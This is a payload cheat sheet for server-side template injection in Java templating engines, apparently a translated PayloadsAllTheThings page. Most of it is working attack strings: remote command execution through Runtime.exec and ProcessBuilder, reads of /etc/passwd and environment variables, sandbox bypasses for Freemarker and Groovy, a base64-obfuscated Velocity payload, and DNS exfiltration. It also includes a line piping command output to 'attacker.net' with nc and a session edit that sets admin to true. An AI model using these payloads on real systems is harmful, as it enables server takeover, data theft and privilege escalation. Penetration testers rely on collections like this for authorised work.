# Server Side Template Injection - Java

> Server-Side Template Injection (SSTI)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker.

## Summary

- [Templating Libraries](#templating-libraries)
- [Java](#java)
    - [Java - Basic Injection](#java---basic-injection)
    - [Java - Retrieve Environment Variables](#java---retrieve-environment-variables)
    - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
- [Freemarker](#freemarker)
    - [Freemarker - Basic Injection](#freemarker---basic-injection)
    - [Freemarker - Read File](#freemarker---read-file)
    - [Freemarker - Code Execution](#freemarker---code-execution)
    - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)
- [Codepen](#codepen)
- [Jinjava](#jinjava)
    - [Jinjava - Basic Injection](#jinjava---basic-injection)
    - [Jinjava - Command Execution](#jinjava---command-execution)
- [Pebble](#pebble)
    - [Pebble - Basic Injection](#pebble---basic-injection)
    - [Pebble - Code Execution](#pebble---code-execution)
- [Velocity](#velocity)
- [Groovy](#groovy)
    - [Groovy - Basic Injection](#groovy---basic-injection)
    - [Groovy - Read File](#groovy---read-file)
    - [Groovy - HTTP Request:](#groovy---http-request)
    - [Groovy - Command Execution](#groovy---command-execution)
    - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
- [Spring Expression Language](#spring-expression-language)
    - [SpEL - Basic Injection](#spel---basic-injection)
    - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)
    - [SpEL - Session Attributes](#spel---session-attributes)
    - [SpEL - Command Execution](#spel---command-execution)
- [References](#references)

## Templating Libraries

| 模板名称 | 负载格式 |
| ------------ | --------- |
| Codepen    | `#{}`     |
| Freemarker | `${3*3}`, `#{3*3}`, `[=3*3]` |
| Groovy     | `${9*9}`  |
| Jinjava    | `{{ }}`   |
| Pebble     | `{{ }}`   |
| Spring     | `*{7*7}`  |
| Thymeleaf  | `[[ ]]`   |
| Velocity   | `#set($X="") $X`             |

## Java

### Java - Basic Injection

> 可以使用多个变量表达式，如果`${...}`不起作用，请尝试`#{...}`，`*{...}`，`@{...}`或`~{...}`。

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Java - Retrieve Environment Variables

```java
${T(java.lang.System).getenv()}
```

### Java - Retrieve /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

---

## Freemarker

[官方网站](https://freemarker.apache.org/)
> Apache FreeMarker™是一个模板引擎：基于模板和变化数据生成文本输出（HTML网页、电子邮件、配置文件、源代码等）的Java库。

你可以在[https://try.freemarker.apache.org](https://try.freemarker.apache.org)测试你的负载

### Freemarker - Basic Injection

模板可以是：

- 默认：`${3*3}`  
- 传统：`#{3*3}`
- 替代：`[=3*3]` 自[FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)以来

### Freemarker - Read File

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
将返回的字节转换为ASCII
```

### Freemarker - Code Execution

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

### Freemarker - Sandbox Bypass

:warning: 仅适用于低于2.3.30版本的Freemarker

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## Codepen

[官方网站](https://codepen.io/)
>

```python
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

---

## Jinjava

[官方网站](https://github.com/HubSpot/jinjava)
> 基于Java的模板引擎，基于django模板语法，适用于渲染jinja模板（至少是HubSpot内容中使用的jinja子集）。

### Jinjava - Basic Injection

```python
{{'a'.toUpperCase()}} 将导致 'A'
{{ request }} 将返回一个请求对象，如com.[...].context.TemplateContextRequest@23548206
```

Jinjava是Hubspot开发的开源项目，可在[https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)获得

### Jinjava - Command Execution

由[HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)修复

```ps1
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

---

## Pebble

[官方网站](https://pebbletemplates.io/)

> Pebble是一个受[Twig](./PHP.md#twig)启发的Java模板引擎，类似于Python [Jinja](./Python.md#jinja2)模板引擎语法。它具有模板继承和易于阅读的语法，内置自动转义以确保安全，并包含对国际化的集成支持。

### Pebble - Basic Injection

```java
{{ someString.toUPPERCASE() }}
```

### Pebble - Code Execution

Pebble的旧版本（<3.0.9版本）：`{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`。

Pebble的新版本：

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

---

## Velocity

[官方网站](https://velocity.apache.org/engine/1.7/user-guide.html)

> Apache Velocity是一个基于Java的模板引擎，允许Web设计人员直接在模板中嵌入Java代码引用。

在易受攻击的环境中，Velocity的表达式语言可以被滥用以实现远程代码执行（RCE）。例如，此负载执行whoami命令并打印结果：

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

支持base64编码命令的更灵活和隐蔽的负载，允许执行任意shell命令，如`echo "a" > /tmp/a`。以下是使用base64中`whoami`的示例：

```java
#set($base64EncodedCommand = 'd2hvYW1p')

#set($contextObjectClass = $knownContextObject.getClass())

#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))

#set($StringClass = $contextObjectClass.forName("java.lang.String"))
#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))

#set($commandArgs = ["/bin/sh", "-c", $command])

#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
#set($processBuilder = $processBuilder.redirectErrorStream(true))
#set($process = $processBuilder.start())
#set($exitCode = $process.waitFor())

#set($inputStream = $process.getInputStream())
#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
#set($scannerDelimiter = $scanner.useDelimiter("\\A"))

#if($scanner.hasNext())
  #set($output = $scanner.next().trim())
  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
#end
```

---

## Groovy

[官方网站](https://groovy-lang.org/)

### Groovy - Basic injection

参考[groovy-lang.org/syntax](https://groovy-lang.org/syntax.html)，但`${9*9}`是基本注入。

### Groovy - Read File

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### Groovy - HTTP Request

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### Groovy - Command Execution

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### Groovy - Sandbox Bypass

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

或者

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

---

## Spring Expression Language

[官方网站](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)

> Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于统一EL，但提供额外功能，最值得注意的是方法调用和基本字符串模板功能。

### SpEL - Basic Injection

```java
${7*7}
${'patt'.toString().replace('a', 'x')}
```

### SpEL - DNS Exfiltration

DNS查找

```java
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
```

### SpEL - Session Attributes

修改会话属性

```java
${pageContext.request.getSession().setAttribute("admin",true)}
```

### SpEL - Command Execution

- 使用`java.lang.Runtime`的方法#1 - 通过JavaClass访问

    ```java
    ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
    ```

- 使用`java.lang.Runtime`的方法#2

    ```java
    #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
    #{session.getAttribute("rtc").setAccessible(true)}
    #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
    ```

- 使用`java.lang.Runtime`的方法#3 - 通过`invoke`访问

    ```java
    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
    ```

- 使用`java.lang.Runtime`的方法#3 - 通过`javax.script.ScriptEngineManager`访问

    ```java
    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
    ```

- 使用`java.lang.ProcessBuilder`的方法

    ```java
    ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
    ${request.getAttribute("c").add("cmd.exe")}
    ${request.getAttribute("c").add("/k")}
    ${request.getAttribute("c").add("ping x.x.x.x")}
    ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
    ${request.getAttribute("a")}
    ```

## References

- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
- [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
- [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
- [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
- [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
